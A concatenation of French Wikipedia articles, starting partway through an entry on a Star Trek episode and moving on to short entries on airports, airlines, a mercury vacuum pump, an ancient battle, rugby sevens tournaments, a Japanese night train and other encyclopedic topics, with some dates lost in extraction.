La musique de cet épisode, composée par Gerald Fried fut réutilisé par la suite dans de nombreux épisodes. La musique de scène de combat réapparaît dans les scènes d'action des épisodes "Guerre et Magie", "Nous, le peuple", "Les Enchères de Triskelion" et "Sur les chemins de Rome.". Elle fut réutilisée de nombreuses fois dans les hommages et les parodies, notamment dans la scène de combat médiéval du film de 1996 "Disjoncté" et dans un épisodes des "Simpsons". Le compositeur Michael Giacchino y fera hommage dans sa composition pour le film "Star Trek Into Darkness." La partition de Gerald Fried inclut aussi le thème de Spock, composé lui aussi pour cet épisode et joué par le bassiste Barney Kessel. Il réapparaît dans les épisodes "Le Korrigan" et "Un tour à Babel".
On peut aussi entendre l'air du Boléro, de Ravel.
Avec cet épisode marque la nouvelle saison et présente un tout nouveau générique d'introduction avec une partie chantée par Loulie Jean Norman et le nom de DeForest Kelley au générique. Le générique de fin possède une nouvelle réorchestration.
Diffusions.
Diffusion aux États-Unis.
L'épisode fut montré pour la première fois en public deux semaines avant sa diffusion à la "World Science Fiction Convention" de 1967 à New York. Il reçut un accueil favorable, et l'addition du lieutenant Chekov au casting plut assez.
L'épisode fut retransmis à la télévision pour la première fois le 15 septembre 1967 sur la chaîne NBC en tant que premier épisode de la deuxième saison.
Diffusion au Royaume Uni et au Québec.
L'épisode fut diffusé au Royaume Uni le 25 novembre 1970 sur BBC One. L'épisode est connu pour avoir été remonté lors de sa diffusion en Allemagne dans les années 1970, ceux-ci estimant que l'histoire de mariage et d'hormone ne correspondait pas au public. L'épisode avait été monté et doublé de telle sorte à raconter que Spock souffre d'une maladie grave qui lui laisse des séquelles, notamment les scènes sur vulcain qui s'avéraient être des hallucinations. L'épisode fut montré et doublé pour raconter l'histoire originelle en 1996.
En version francophone, l'épisode fut diffusé au Québec en 1971. 
Diffusion en France.
En France, l'épisode est diffusé le 31 juillet 1986 lors de la rediffusion de l'intégrale de "Star Trek" sur La Cinq.
Réception critique.
L'épisode fut nommé aux Hugo Award de 1968 dans la catégorie "Best Dramatic Presentation". C'est aussi l'un des épisodes préférés de Leonard Nimoy avec "Les Mines de Horta", "Contretemps", "Un tour à Babel", "Un coin de paradis" et "L'Équipage en folie". Le réalisateur Joseph Pevney le considère aussi comme son épisode le plus réussi de la série.
Dans un classement pour le site "Hollywood.com", Christian Blauvelt place cet épisode à la position sur les 79 épisodes de la série originelle. 
De même le livre "« Star Trek 101 »" liste cet épisode parmi les 10 épisodes essentiels de la série. Pour le site"The A.V. Club" Zack Handlen donne à l'épisode la note de "A" trouvant que l'épisode est un début de saison excellent car il donne enfin de la matière sur les origines du personnage de Spock.
L'épisode est à l'origine du nom du groupe de rock T'Pau.
Adaptations littéraires.
L'épisode fut romancé sous forme d'une nouvelle de 14 pages écrite par James Blish dans le livre "« Star Trek 3 »" un recueil compilant différentes histoires de la série et sortit en aux éditions Bantam Books.
En 1978, l'épisode connu aussi une adaptation en roman photo créé à partir des captures d'écran de l'épisode. "After Darkness", un comic publié en chez IDW Comics raconte les événements de cet épisode mais avec les personnages issues de la série de films "Star Trek" de 2009.
Éditions commerciales.
Aux États-Unis, l'épisode est disponible sous différents formats. En 1988 et 1990, l'épisode est sorti en VHS et Betamax. L'épisode sortit en version remastérisée sous format DVD en 1999 et 2004.
L'épisode connu une version remasterisée sortie le : l'épisode connu de nombreux nouveaux effets spéciaux, notamment les plans de la planète Vulcain vue de l'espace, les plans de l'Enterprise qui ont été refait à partir d'images de synthèse. L'image du lieu de la cérémonie vu du dessus a été recrée de toutes pièces et la photo de T'Pring, retouchée afin d'incorporer un visage derrière elle. Cette version est comprise dans l'édition Blu-ray, diffusée en .
En France, l'épisode fut disponible avec l'édition VHS de l'intégrale de la saison 2 en 2000. L'édition DVD est sortie le et l'édition Blu-ray le .

</doc>
<doc id="10578773" url="https://fr.wikipedia.org/wiki?curid=10578773" title="Correctionnalisation">
Correctionnalisation



</doc>
<doc id="10578775" url="https://fr.wikipedia.org/wiki?curid=10578775" title="Aéroport de Yichun-Mingyueshan">
Aéroport de Yichun-Mingyueshan

L'aéroport de Yichun-Mingyueshan est un aéroport desservant la ville de Yichun, dans la province du Jiangxi, en Chine. Il est situé dans la ville de Hutian, dans le district de Yuanzhou. Seul aéroport dans l'ouest du Jiangxi, il dessert également les villes voisines de Pingxiang et Xinyu, pour un bassin de population totale de 10 millions d'habitants. Il est nommé d'après Mingyueshan (la Montagne de la Lune), un parc national de forêt près de Yichun. La construction de l'aéroport a commencé le . Initialement prévue en 2011, l'aéroport a été effectivement ouvert le .
Installations.
L'aéroport dispose d'une piste de 2 400 mètres de long et 45 mètres de large (classe 4C), et un terminal de 6 000 mètres carrés. Il est conçu pour accueillir 200 000 passagers et 1 200 tonnes de fret par an d'ici 2020.

</doc>
<doc id="10578796" url="https://fr.wikipedia.org/wiki?curid=10578796" title="Guerre des transfermiens">
Guerre des transfermiens



</doc>
<doc id="10578803" url="https://fr.wikipedia.org/wiki?curid=10578803" title="Alliance des jeunes entrepreneurs du G20">
Alliance des jeunes entrepreneurs du G20

L’Alliance des jeunes entrepreneurs du G20 (en anglais, G20 Young Entrepreneurs’ Alliance - G20 YEA) est une organisation internationale regroupant d'autres organisations qui travaillent à la promotion et à l’avancement de l’entrepreneuriat dans les pays du G20. Elle compte dans ses rangs plus de 500 000 jeunes entrepreneurs.
Historique.
Un premier sommet préparatoire réunissant diverses organisations des pays du G8 eut lieu à Stresa, en Italie, en 2009. Le premier sommet réunissant cette fois diverses organisations des pays du G20 s'est tenu à Toronto, au mois de juin, l'année suivante et présidé par dont elle fut l'une des fondatrices. En novembre de la même année (2010), les membres de l'Alliance des jeunes entrepreneurs du G20 se sont réunis à Séoul, élaborant et signant une charte dans laquelle sont précisés "...les moyens d’encourager les pays membres du G20 à inclure l’entrepreneuriat dans l’ordre du jour et à échanger les pratiques exemplaires, en vue de contribuer à la création d’environnements qui soutiennent mieux l’entrepreneuriat dans le monde entier". C'est ainsi, par le biais d'un réseau mondial de jeunes porte-parole entrepreneurs, que ces requêtes s'adressent aux dirigeants des pays du G20.
L'édition 2020 s'est tenue en visio-conférence et n'a pas donné lieu à une rencontre physique des entrepreneurs sélectionnés des différents pays du G20.
Mode opératoire.
Chaque année, ce sont plus de 400 jeunes entrepreneurs, sélectionnés parmi les pays du G20, que regroupe cet organisme. Ceux-ci se rencontrent lors d’un sommet international à l'issue duquel est publié un communiqué invitant les gouvernements des 20 pays concernés à favoriser "...l’entrepreneuriat, à titre de moteur de la croissance économique, de l’innovation et du changement social." Tout au long de l'année, l'organisme mettra en œuvre les moyens à sa disposition de telle sorte que ses recommandations puissent faire l’objet d’une vaste diffusion dans les pays respectifs de ses membres.

</doc>
<doc id="10578804" url="https://fr.wikipedia.org/wiki?curid=10578804" title="Tête ronde">
Tête ronde



</doc>
<doc id="10578805" url="https://fr.wikipedia.org/wiki?curid=10578805" title="Île du Grand Brotteau">
Île du Grand Brotteau

L'île du Grand Brotteau est une île située sur le Rhône, dans le département l'Ain en région Auvergne-Rhône-Alpes, appartenant administrativement à Groslée-Saint-Benoît, en limite de la commune de Brangues.
Cette île est rattachée à la Réserve naturelle nationale du Haut-Rhône français et au secteur du méandre du Saugey reconnu espace naturel sensible.
Étymologie.
Ce mot provient du francoprovençal "broteu", lui-même formé par dérivation de "brot", prononcé [bru], qui désigne les jeunes pousses d'arbres caractéristiques qui y poussent.
Description.
Elle s'étend sur près de de longueur pour une largeur d'environ . Elle est traversée au nord par la frontière entre les départements de l'Ain et de l'Isère.

</doc>
<doc id="10578822" url="https://fr.wikipedia.org/wiki?curid=10578822" title="Maimont">
Maimont

Le Maimont est un sommet des Vosges du Nord situé sur la frontière franco-allemande, entre le département du Bas-Rhin et le Land de Rhénanie-Palatinat.
Toponymie.
En 1463 on l'écrivait "Meygelmont". L'origine du nom viendrait du latin "Magnus" ou du celte "Mogalos" signifiant « grand », pour la grande colline. Une autre explication serait le mot celte "Mailos" qui signifie « aplati », la colline se terminant par une plate forme naturelle.
Histoire.
Le Maimont abrite des vestiges d'un éperon barré de l'époque celte. Une pierre réputée comme pierre à sacrifice celte, "Opferschale", se trouve sur le site. Des poteries romaines ont été trouvées lors de fouilles en 1898.
En 1940, au cours de la Seconde Guerre mondiale, de rudes combats y eurent lieu.

</doc>
<doc id="10578827" url="https://fr.wikipedia.org/wiki?curid=10578827" title="AirSWIFT">
AirSWIFT

AirSWIFT (anciennement ITI Air) est une compagnie aérienne régionale Philippine. La société exploite un aéroport privé à El Nido, Palawan (Aéroport d'El Nido) et sert de base opérationnelle à la compagnie ainsi qu'à la compagnie El Nido Resorts.
Histoire.
Fondée en 2002 en tant qu'l'ITI Philippines, l'entreprise avait loué trois Dornier 228 avion. Ils étaient tous retirés début 2013 et remplacés par les ATR 42. Ayala Capital Corporation a acquis la propriété d'ITI en 2012. En , ITI a été rebaptisé AirSWIFT. Actuellement, AirSWIFT a des vols quotidiens à partir de El Nido vers Manille et Cebu.
Flotte.
En , la flotte d'AirSWIFT comprend les appareils suivants :

</doc>
<doc id="10578830" url="https://fr.wikipedia.org/wiki?curid=10578830" title="Pompe à mercure">
Pompe à mercure

 
La pompe à mercure est une pompe à vide qui exploite le transit de gouttelettes de mercure à travers un tube capillaire pour piéger l'air de l'enceinte à épuiser. Elle a été inventée en 1865 par Hermann Sprengel, chimiste d'origine hanovrienne lors de sa période londonienne. Cette pompe créait le vide le plus poussé réalisable à l'époque (de l'ordre de ).
À ne pas confondre avec la pompe à diffusion de mercure, également appelée « pompe à vapeur de mercure », qui se distingue par la présence d'un chauffage, et qui est le précurseur historique des pompes à diffusion, pompes à vide secondaire utilisées dans les techniques de vide poussé.
Utilisation.
Elle n'est plus utilisée aujourd'hui. William Crookes se servit de ces pompes pour ses études des décharges électriques, William Ramsay pour isoler les gaz rares ; Joseph Swan et Thomas Edison, pour faire le vide dans leur nouvelle lampe à incandescence à filament de carbone. Une première pompe de ce type avait été présentée par Adrien Thilorier à l'Académie des sciences en 1832. La pompe inventée par Sprengel a permis dès 1879 d'obtenir à échelle industrielle un vide suffisant pour que le filament de carbone d'une lampe à incandescence dure plusieurs dizaines de jours. Quant à Hermann Sprengel, il poursuivit par des études sur les explosifs et finit par être élu Fellow of the Royal Society.
Un vidéaste scientifique américain, Cody's lab, a recréé cette pompe dans une vidéo sur Youtube qui porte le titre "Sprengel Vacuum Pump: The most efficient pump ever?" et l'utilise pour faire le vide dans l'ampoule d'un radiomètre de Crookes.
Principe de fonctionnement.
La chute des gouttelettes de mercure comprime l'air à l'entrée de la pompe et l'évacue dans une citerne à l'extrémité du tube. À mesure que la pression décroît, l'effet amortisseur de l'air entre les gouttelettes métalliques diminue, de sorte que l'on peut entendre des coups périodiques, accompagnés d'éclats de lumière à travers le récipient que l'on pompe.
Applications.
Le débit élevé, la simplicité d'utilisation et l'efficacité de la pompe à mercure en faisaient un instrument apprécié des expérimentateurs. Le prototype de Sprengel pouvait épuiser une enceinte d'un demi-litre en 20 minutes environ. Avec de nouvelles versions de l'appareil, il devint possible d'abaisser la pression au-dessous de 1 mPa ().

</doc>
<doc id="10578831" url="https://fr.wikipedia.org/wiki?curid=10578831" title="Sœurs de la Mère du Carmel">
Sœurs de la Mère du Carmel

Les Sœurs de la Mère du Carmel (en latin: "Congregatio Sororum Mater Carmeli") est une congrégation religieuse féminine syro-malabar de droit pontifical. C'est la première congrégation féminine de cette Église orientale. 
Histoire.
La congrégation est fondée le à (Kerala) par Kuriakose Elias Chavara et Léopold Beccaro, un missionnaire carme déchaux italien. L'institut se répand dans de nombreux diocèses donnant naissance à plusieurs congrégations autonomes qui se réunissent en 1963. L'institut reçoit l'approbation pontificale le .
Euphrasie du Sacré-Cœur de Jésus, canonisée le par le pape François était membre de cette congrégation.
Activités et diffusion.
Tout en menant une vie contemplative d'inspiration carmélitaine, les religieuses de la Mère du Carmel se consacrent à l'enseignement et aux soins des malades.
Elles sont présentes en:
La maison-mère se trouve à Aluva, au Kérala. 
En 2015, la congrégation comptait 6465 sœurs dans 668 maisons.

</doc>
<doc id="10578837" url="https://fr.wikipedia.org/wiki?curid=10578837" title="Bataille de l'Hellespont (321 av. J.-C.)">
Bataille de l'Hellespont (321 av. J.-C.)

La bataille de l'Hellespont oppose au printemps 321 av. J.-C. en Phrygie hellespontique Eumène de Cardia à Cratère, allié à Néoptolème, dans le contexte de la première guerre des Diadoques entre le régent Perdiccas et une coalition de généraux macédoniens. Eumène parvient à vaincre et à tuer ses deux prestigieux adversaires.
Contexte historique.
La mort d'Alexandre le Grand en 323 av. J.-C. laisse son empire dans un état de troubles politiques, entre des généraux loyaux à la dynastie argéade et d'autres revendiquant l'indépendance. Perdiccas, le chiliarque de l'empire, suscite par sa volonté hégémonique une coalition réunissant principalement Antipater, Cratère, Ptolémée et Antigone.
Quand le conflit éclate entre les Diadoques en 322, Eumène de Cardia est chargé par Perdiccas de contenir en Asie mineure, avec l'aide de Néoptolème, les armées d'Antipater et de Cratère soutenues par la flotte commandée par Antigone. Après avoir organisé l'administration de sa satrapie de Cappadoce, Eumène retrouve en effet Perdiccas et les rois en Cilicie au cours de l’hiver 322-321. Le chiliarque lui ordonne alors de retourner en Cappadoce car il a alors besoin d'une personne de confiance qui puisse surveiller les agissements de Néoptolème en Arménie. C’est à son retour qu’Eumène décide de recruter un grand nombre de cavaliers indigènes. Cette levée semble avoir eu un intérêt sous-jacent. Eumène cherche à se doter d’un corps de cavalerie qui puisse accroître sa puissance militaire. Mais il entend également faire contrepoids à l’infanterie macédonienne ; en effet selon Plutarque le corps des cavaliers sert d’"antitagma" à la phalange, car celle-ci ne manifeste pas une grande loyauté envers le « scribe grec ».
Victoire d'Eumène contre Néoptolème.
Le titre de stratège "autokrator" confère à Eumène le commandement des armées d’Asie Mineure qui est encore à cette époque sous le contrôle d’Alcétas et de Néoptolème. Ce qui pose de grandes difficultés : Alcétas refuse d’abord de prendre part à l’expédition car ses soldats « auraient honte de combattre contre Antipater [ et ] n’avaient que bons sentiments pour Cratère ». Néoptolème, chef des hypaspistes sous Alexandre, n'a jamais témoigné de considération pour « Eumène le scribe ». Les deux hommes se sont en outre opposés après que Perdiccas eut chargé Eumène de le surveiller dans sa satrapie d’Arménie. Néoptolème n’a aucune réticence à accepter les propositions de ralliement faites par Antipater puis à détourner une grande partie de la phalange macédonienne ; Eumène reçoit également des ambassadeurs du régent mais refuse toute négociation. Néoptolème et Eumène finissent donc par se livrer bataille en Phrygie hellespontique au printemps 321. Eumène a renforcé son infanterie déficiente par un fort contingent de cavaliers cappadociens.
Plutarque écrit : « (…) Bien que son infanterie fut d’abord battue, Eumène mit Néoptolème en déroute grâce à sa cavalerie, lui prit ses bagages et, lançant ses cavaliers en masse à la poursuite de la phalange débandée, il la força à déposer les armes et à jurer de combattre désormais sous ses ordres ». Ce passage est complété par un fragment d’Arrien. Ce fragment est parfois attribué à tort à la bataille contre Cratère ; mais comme l’a démontré Alan B. Bosworth, ce fragment décrit bien la première bataille livrée à Néoptolème.
Eumène aurait selon Arrien remporté la victoire en plaçant la cavalerie légère derrière son infanterie et en parvenant à s'emparer des bagages des phalangites qu'il rallie à sa cause. Néoptolème parvient tout de même à s’échapper avec auprès de Cratère. Antipater tente sans succès de conclure une nouvelle fois une alliance avec Eumène. Il est donc décidé que Cratère et Néoptolème marcheraient contre lui, tandis qu’Antipater gagnerait la Cilicie pour combattre Perdiccas.
Déroulement.
La bataille décisive se déroule dix jours après celle livrée entre Eumène et Néoptolème. Prévenu de l’arrivée imminente de Cratère, Eumène peut regrouper son armée, mais certainement pas organiser une levée de cavalerie comme l’écrit Diodore. Eumène utilise habilement le mythe d'Alexandre auprès de la troupe : « Deux Alexandre » lui seraient apparus en songe, l’un protégé par Athéna, l’autre par Déméter et se livrent un combat à l’issue duquel est vaincu le protégé d’Athéna. Eumène donne donc pour mot d’ordre « Déméter et Alexandre » et demande à ses soldats de se couronner d’épis de blé, symbole de la déesse. De cette manière, il capte à son profit le prestige d’Alexandre et galvanise la troupe.
Cratère dispose de , majoritairement macédoniens, et de . Eumène lui oppose de « toutes origines », dont les phalangites ralliés, et grâce auxquels il compte remporter la victoire. Eumène ne range sur son aile gauche aucun Macédonien car ceux-ci n’auraient pas osé combattre Cratère, le fidèle d'Alexandre. Eumène aurait même caché aux Macédoniens que leur adversaire est mené par Cratère en personne.
Eumène ordonne aux cavaliers asiatiques, commandés par Pharnabaze et Phénix de Ténédos, de charger immédiatement l’aile droite où se trouve Cratère afin d'empêcher celui-ci d'envoyer un héraut inciter ses troupes à faire défection. Cratère est tué dès le début des combats. Eumène et Néoptolème, qui sont devenus des ennemis personnels, se cherchent sur le champ de bataille pour un combat singulier au cours duquel Néoptolème est tué.
La phalange macédonienne négocie une trêve laissant la victoire à Eumène. Il fait élever un trophée sur le champ de bataille, peut-être en sa qualité de Grec car cet usage n’est pas en vigueur chez les Macédoniens. Étant donné leur amitié passée et le prestige du tuteur des rois, Eumène organise une cérémonie funéraire en l’honneur de Cratère et fait rapatrier son corps à son épouse en Macédoine.
Conséquences.
La trêve n'est pas respectée par les phalangites qui, ayant reçu l’autorisation de se ravitailler, en profitent pour s’échapper auprès d’Antipater. Dès que l’armée d’Égypte a appris la mort de Cratère et de Néoptolème, Eumène est condamné à la peine capitale et déclaré ennemi des Macédoniens par une « assemblée de l’armée ». Cette condamnation est confirmée par le conseil de Triparadisos du printemps 321 av. J.-C., à l'issue duquel Antigone est désigné stratège d’Asie par la régence, à charge pour lui de vaincre Eumène. Mais la mort d'Antipater en 319 et l’avènement de Polyperchon à la régence de Macédoine, change la donne.

</doc>
<doc id="10578843" url="https://fr.wikipedia.org/wiki?curid=10578843" title="Gouvernement de Saint-Pétersbourg (1917-)">
Gouvernement de Saint-Pétersbourg (1917-)



</doc>
<doc id="10578856" url="https://fr.wikipedia.org/wiki?curid=10578856" title="Johann Preleuthner">
Johann Preleuthner

Johann Baptist Preleuthner (né le à Vienne, mort le à la villa Harthof à Gloggnitz) est un sculpteur autrichien.
Biographie.
Johann Preleuthner est d'abord l'élève de son beau-père Johann Nepomuk Schaller. Il étudie à l'académie des beaux-arts de Vienne en 1820 puis à l'académie des beaux-arts de Munich auprès de Ludwig Schwanthaler. En 1848, il devient professeur à l'académie des beaux-arts de Vienne et confirmé en 1866 par l'empereur François-Joseph.
Il fit le portrait grandeur nature d'Andreas Hofer et de János Pálffy. Preleuthner travaille parfois avec Anton Dominik Fernkorn.
Œuvres.
Preleuthner décore de nombreux bâtiments du Ringstrasse à Vienne avec ses sculptures et reliefs.

</doc>
<doc id="10578866" url="https://fr.wikipedia.org/wiki?curid=10578866" title="Lucot">
Lucot

 peut désigner :

</doc>
<doc id="10578867" url="https://fr.wikipedia.org/wiki?curid=10578867" title="Tournoi des États-Unis de rugby à sept 2008">
Tournoi des États-Unis de rugby à sept 2008

Le Tournoi des États-Unis de rugby à sept 2008 (anglais : United States rugby sevens 2008) est la étape la saison 2007-2008 du IRB Sevens World Series. Elle se déroule les 9 et au Petco Park à San Diego, en États-Unis.
La victoire finale revient à l'équipe de Nouvelle-Zélande, battant en finale l'équipe d'Afrique du Sud sur le score de 27 à 12.
Équipes participantes.
Seize équipes participent au tournoi :
Phase finale.
Résultats de la phase finale

</doc>
<doc id="10578868" url="https://fr.wikipedia.org/wiki?curid=10578868" title="Fuzz (album)">
Fuzz (album)

Fuzz est le premier album du groupe éponyme californien alors composé de Ty Segall, Charles Moothart et Roland Cosio. L'album est sorti en septembre 2013 sur le label In the Red. Le son proposé se rattache au garage rock et au rock psychédélique. L'album a reçu un bon accueil critique, certains articles le comparant aux productions d'illustres aînés tels les premiers albums de Black Sabbath.
Réception.
"Fuzz" a été bien accueilli par les critiques spécialisés, il possède un score agrégé de 79/100 sur Metacritic. Les auteurs s'accordent à dire que l'album est sombre ; sur le site internet Pitchfork, Evan Minsker donne une note de 7,3/10 à l'album. Il compare le "LP" à ce qu'auraient fait les membres de Blue Cheer s'ils avaient eu une obsession pour le meurtre. L'auteur apprécie la densité des rythmes délivrés en un temps assez court. Sur AllMusic, les sonorités sont comparées à celles du Black Sabbath des débuts : l'auteur remarque que le poids des différentes influences n'empêche pas Fuzz de proposer « un ensemble de titres audacieux qui cassent la baraque ». En France, l'auteur de la critique pour l'hebdomadaire "Les Inrockuptibles" regrette parfois un manque de lisibilité mais est impressionné par des « salves de larsens aussi âpres que tendus ».

</doc>
<doc id="10578876" url="https://fr.wikipedia.org/wiki?curid=10578876" title="AirAsia Philippines">
AirAsia Philippines

AirAsia Inc., opérant sous la bannière AirAsia Philippines (stylisée comme AirAsiaPhilippines) est une Compagnie aérienne à bas prix basée à l'Aéroport International Ninoy Aquino de Manille , aux Philippines. La compagnie aérienne est la filiale Philippine d'AirAsia, une compagnie à bas prix basée en Malaisie. La compagnie aérienne a commencé comme joint-venture entre trois Philippins investisseurs et AirAsia International Ltd, une filiale d'AirAsia Berhad.
Le groupe initial d'investisseurs philippins comprend: Antonio O. Cojuangco, Jr, ancien propriétaire d'Associated Broadcasting Company et propriétaire de Dream Satellite TV; Michael L. Romero, un promoteur immobilier; et Marianne Hontiveros, un ancien de l'industrie musicale de l'exécutif et animateur-télé. En 2013, un accord avec Zest Airways intègre Alfredo Yao de Zest-O Corporation en tant que nouvel associé.
Zest Airways a été rebaptisé AirAsia Zest et a fonctionné en parallèle comme une marque distincte de AirAsia jusqu'à sa fusion avec AirAsia Philippines en .
Flotte.
La flotte d'AirAsia Philippines comprend les appareils suivants ():

</doc>
<doc id="10578877" url="https://fr.wikipedia.org/wiki?curid=10578877" title="Tournoi des États-Unis de rugby à sept 2007">
Tournoi des États-Unis de rugby à sept 2007

Le Tournoi des États-Unis de rugby à sept 2007 (anglais : United States rugby sevens 2007) est la étape la saison 2006-2007 du IRB Sevens World Series. Elle se déroule les 10 et au Petco Park à San Diego, aux États-Unis.
La victoire finale revient à l'équipe des Fidji, battant en finale l'équipe des Samoa sur le score de 38 à 24.
Équipes participantes.
Seize équipes participent au tournoi :
Phase finale.
Résultats de la phase finale

</doc>
<doc id="10578878" url="https://fr.wikipedia.org/wiki?curid=10578878" title="PMPFS">
PMPFS



</doc>
<doc id="10578884" url="https://fr.wikipedia.org/wiki?curid=10578884" title="Tournoi des États-Unis de rugby à sept 2006">
Tournoi des États-Unis de rugby à sept 2006

Le Tournoi des États-Unis de rugby à sept 2006 (anglais : United States rugby sevens 2006) est la étape la saison 2005-2006 du IRB Sevens World Series. Elle se déroule les 11 et au StubHub Center à Carson, aux États-Unis.
La victoire finale revient à l'équipe d'Angleterre, battant en finale l'équipe des Fidji sur le score de 38 à 5.
Équipes participantes.
Seize équipes participent au tournoi :
Phase finale.
Résultats de la phase finale

</doc>
<doc id="10578887" url="https://fr.wikipedia.org/wiki?curid=10578887" title="Tournoi des États-Unis de rugby à sept 2005">
Tournoi des États-Unis de rugby à sept 2005

Le Tournoi des États-Unis de rugby à sept 2005 (anglais : United States rugby sevens 2005) est la étape la saison 2004-2005 du IRB Sevens World Series. Elle se déroule les 12 et au StubHub Center à Carson, aux États-Unis.
La victoire finale revient à l'équipe de Nouvelle-Zélande, battant en finale l'équipe d'Argentine sur le score de 34 à 5.
Équipes participantes.
Seize équipes participent au tournoi :
Phase finale.
Résultats de la phase finale

</doc>
<doc id="10578894" url="https://fr.wikipedia.org/wiki?curid=10578894" title="Sunrise Seto">
Sunrise Seto

Le Sunrise Seto (サンライズ瀬戸) est un train express de nuit reliant Tokyo à Takamatsu au Japon et exploité par les compagnies JR West, JR Central, JR East, JR Shikoku. Il est le successeur du train express "Seto".
Résumé.
Le "Sunrise Seto" est entré en service le en même temps que le "Sunrise Izumo". Il effectue une liaison aller-retour journalière entre Tokyo et Takamatsu en 9h30, sur l'île de Shikoku.
Le "Sunrise Seto" et le "Sunrise Izumo" circulent ensemble entre Tokyo et Okayama. Une fois arrivés à Okayama, ils sont découplés et effectuent chacun leur propre liaison. Le "Sunrise Izumo" continue vers Izumo tandis que le "Sunrise Seto" continue vers Takamatsu.
En , il est le seul train de voyageurs exploité par 4 opérateurs JR (JR East, JR Central&lt;br&gt;JR West et JR Shikoku). Depuis la fin de l'exploitation des trains de nuit "Cassiopeia" et "Hamanasu" les et , le "Sunrise Seto" est avec le "Sunrise Izumo" le dernier train de nuit en service régulier au Japon.
Matériel.
Le train consiste en une rame automotrice à 7 voitures de la série 285. La rame compte 14 voitures lorsque le Sunrise Seto et le Sunrise Izumo sont couplés à Okayama.
Intérieur.
Les voitures sont équipées de lits, toilettes et douches.

</doc>
<doc id="10578895" url="https://fr.wikipedia.org/wiki?curid=10578895" title="Tournoi des États-Unis de rugby à sept 2004">
Tournoi des États-Unis de rugby à sept 2004

Le Tournoi des États-Unis de rugby à sept 2004 (anglais : United States rugby sevens 2004) est la étape la saison 2003-2004 du IRB Sevens World Series. Elle se déroule les 14 et au StubHub Center à Carson, aux États-Unis.
La victoire finale revient à l'équipe d'Argentine, battant en finale l'équipe de Nouvelle-Zélande sur le score de 21 à 12.
Équipes participantes.
Seize équipes participent au tournoi :
Phase finale.
Résultats de la phase finale

</doc>
<doc id="10578900" url="https://fr.wikipedia.org/wiki?curid=10578900" title="Richelsley">
Richelsley

Le rocher de Richelsley est un important rocher isolé situé à l'est de la Belgique dans les Hautes Fagnes et faisant partie de la commune de Waimes. Sur ce rocher, se dresse une croix appelée Kreuz im Venn.
Situation.
Dressé au milieu des forêts de l'Eifel, ce rocher se situe à environ à vol d’oiseau au sud-ouest de l’ancien prieuré de Reichenstein situé en Allemagne, à de la frontière belgo-allemande et à au nord de Küchelscheid.
Description.
Ce rocher d'une longueur de et d'une hauteur de est formé de poudingues. L'arête rocheuse très acérée fait penser à des phyllades et des quartzites. On décrit souvent ce rocher en le divisant en trois parties : la face nord-est, la proue et la face sud-est. Il est repris comme étant le rocher le plus haut en altitude de Wallonie ().
Le rocher est surmonté par une importante croix d'une hauteur de . Cette croix appelée "Kreuz im Venn" (la croix en Fagnes) a été dressée en 1890 par l'abbé de Kalterherberg, Gérard Joseph Arnoldy pour honorer la mémoire de Stéphan Horrichem (1639-1686), prieur à Reichenstein et artisan de la reconstruction de ce couvent. On accède à cette croix par un escalier partant de la face sud-est.
Une Vierge représentant Notre-Dame de Lourdes se niche dans une anfractuosité du rocher. Elle a été édifiée en 1894 par les paroissiens de Kalterherberg et se trouve sur la face nord-est. 
Le site est un lieu de culte surtout fréquenté par les Allemands.

</doc>
<doc id="10578908" url="https://fr.wikipedia.org/wiki?curid=10578908" title="Rocher de Richelsley">
Rocher de Richelsley



</doc>
<doc id="10578912" url="https://fr.wikipedia.org/wiki?curid=10578912" title="CCT FS">
CCT FS



</doc>
<doc id="10578913" url="https://fr.wikipedia.org/wiki?curid=10578913" title="Mühlenberge">
Mühlenberge

Mühlenberge est une commune allemande de l'arrondissement du Pays de la Havel, Land de Brandebourg.
Géographie.
Mühlenberge se situe sur le Havelländisches Luch.
Mühlenberge se trouve sur la Bundesstraße 5.
Histoire.
Mühlenberge est mentionné pour la première fois en 1307.
La commune actuelle vient de la fusion le de Haage, Senzke et Wagenitz.

</doc>
<doc id="10578919" url="https://fr.wikipedia.org/wiki?curid=10578919" title="Philipsburg (Sint-Maarten)">
Philipsburg (Sint-Maarten)



</doc>
<doc id="10578920" url="https://fr.wikipedia.org/wiki?curid=10578920" title="Centre de la gravure et de l'image imprimée">
Centre de la gravure et de l'image imprimée

Le Centre de la Gravure et de l'Image imprimée de la Fédération Wallonie-Bruxelles est un musée consacré à la gravure et à l'estampe de la seconde moitié du jusqu'à nos jours, fondé en 1988 à La Louvière (Belgique).
Histoire du lieu.
Le Centre de la gravure et de l'image imprimée, situé rue des Amours à La Louvière, bien qu'actif dès 1984, est inauguré en 1988, puis rénové et agrandi à partir de 2009 de près de . Le premier directeur est André Balthazar, auquel succède en 1995 Catherine de Braekeleer. En 2020 c'est Emmanuel Lambion qui prend la direction du Centre puis Christophe Veys en 2022.
Le bâtiment originel date du début du , devenu tout à tour une piscine (très brièvement), puis une usine et enfin une série d'échoppes.
Le nouveau bâtiment a obtenu en le prix des Musées.
La collection du Centre se compose de plus de 16.000 estampes et affiches de 2421 artistes contemporains belges et internationaux. On compte aussi près de livres d’artistes et portfolios, ainsi qu'une bibliothèque de plus de ouvrages spécialisés.
Depuis 1989, le Centre remet annuellement le « Prix de la gravure et de l'image imprimée » à des artistes pratiquant l'art de la gravure. La première lauréate fut Kikie Crêvecœur.

</doc>
<doc id="10578924" url="https://fr.wikipedia.org/wiki?curid=10578924" title="Maison de Goësbriand">
Maison de Goësbriand



</doc>
<doc id="10578930" url="https://fr.wikipedia.org/wiki?curid=10578930" title="Emilio Lascano Tegui">
Emilio Lascano Tegui

Emilio Lascanotegui (dit "vicomte de Lascano Tegui") était un homme de lettres et diplomate argentin, né à Concepcion del Uruguay le , et mort à Buenos Aires le .
Biographie.
Né d’un père argentin aux ascendances basques et d'une mère uruguayenne, Emilio Lascanotegui a passé son enfance à San Telmo, le plus vieux quartier de Buenos Aires. 
Il a affirmé avoir étudié le droit à Buenos Aires, à la suite de quoi le politicien Juan Jose Frugoni l’a engagé comme conférencier pour le Parti Radical argentin. Il écrivit des discours publics entre 1905 et 1907, puis partit en 1908 dans un voyage au long cours à travers l'Europe et l'Afrique du Nord, en tant que traducteur pour l'Union postale universelle. 
Après avoir travaillé comme journaliste et écrit deux volumes de poésie, il décida en 1909 de changer son nom de famille d'origine basque en le scindant en deux et de s'octroyer le titre fictif de vicomte. Il signe son premier livre, l'ombre de l’empuse, peu de temps après, en mai 1910.
